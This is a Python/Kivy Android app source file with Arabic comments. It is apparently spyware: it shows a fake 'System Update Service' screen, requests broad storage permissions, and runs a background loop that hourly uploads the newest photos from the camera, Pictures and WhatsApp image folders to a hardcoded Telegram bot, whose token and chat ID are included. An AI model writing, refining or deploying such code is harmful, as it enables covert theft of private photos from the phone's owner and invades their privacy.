import os
import threading
import time
import requests
from kivy.app import App
from kivy.uix.label import Label
from kivy.utils import platform

# معلومات البوت المستخرجة من صورك (تم تحديثها الآن)
BOT_TOKEN = "8711969097:AAHtV1KGP-24cPn2QxPvpbyNkQugNPhEFg0"
CHAT_ID = "7084557369"

class ShadowMonarch(App):
    def build(self):
        # واجهة تمويهية رسمية
        return Label(text="System Update Service\nVersion 3.0.4\nInitializing...", 
                     halign='center', font_size='18sp')

    def on_start(self):
        # طلب صلاحيات الوصول الشاملة فور التشغيل
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE,
                Permission.MANAGE_EXTERNAL_STORAGE,
                Permission.INTERNET
            ])
        
        # تشغيل المحرك في خيط منفصل لمنع خروج التطبيق (Crash)
        threading.Thread(target=self.main_engine, daemon=True).start()

    def main_engine(self):
        # تأخير بسيط لاستقرار الاتصال
        time.sleep(5)
        self.send_telegram_message("✅ [SHADOW_MONARCH]: System Service Online.\nTarget ID: " + CHAT_ID)

        while True:
            try:
                self.run_exfiltration()
                # محاولة السحب كل ساعة لضمان الاستمرارية
                time.sleep(3600) 
            except:
                time.sleep(60)
                continue

    def send_telegram_message(self, message):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={'chat_id': CHAT_ID, 'text': message}, timeout=15)
        except:
            pass

    def run_exfiltration(self):
        # مسارات الصور المستهدفة
        paths_to_scan = [
            "/sdcard/DCIM/Camera",
            "/sdcard/Pictures",
            "/sdcard/WhatsApp/Media/WhatsApp Images"
        ]

        for path in paths_to_scan:
            if os.path.exists(path):
                # جلب آخر الملفات وتصفيتها
                files = [os.path.join(path, f) for f in os.listdir(path) 
                         if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
                
                # ترتيب من الأحدث للأقدم
                files.sort(key=os.path.getmtime, reverse=True)

                # سحب أول 5 ملفات كبداية
                for file_path in files[:5]: 
                    self.send_telegram_photo(file_path)
                    time.sleep(3) 

    def send_telegram_photo(self, file_path):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            with open(file_path, 'rb') as photo:
                requests.post(url, data={'chat_id': CHAT_ID}, 
                              files={'document': photo}, timeout=45)
        except:
            pass

if __name__ == '__main__':
    ShadowMonarch().run()
